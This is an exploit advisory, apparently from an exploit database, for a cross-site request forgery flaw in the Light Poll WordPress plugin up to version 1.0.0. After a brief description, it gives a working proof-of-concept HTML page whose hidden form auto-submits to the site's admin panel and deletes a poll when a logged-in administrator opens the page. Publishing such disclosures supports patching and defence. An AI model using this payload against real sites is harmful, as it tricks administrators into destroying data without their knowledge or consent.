# Exploit Title: Light Poll <= 1.0.0 - Polls Deletion via CSRF
# Exploit Author: Vuln Seeker Cybersecurity Team
# Vendor Homepage: https://wordpress.org/plugins/light-poll/
# Version: <=1.0.0
# Tested on: Firefox
# Contact me: vulns@vulnseeker.org

Description

The plugin does not have CSRF checks when deleting polls, which could allow
attackers to make logged in users perform such action via a CSRF attack

Proof of Concept

<html>
  <body>
    <form action="http://localhost/wp-admin/admin.php">
      <input type="hidden" name="page" value="lp_settings" />
      <input type="hidden" name="task" value="remove" />
      <input type="hidden" name="id" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
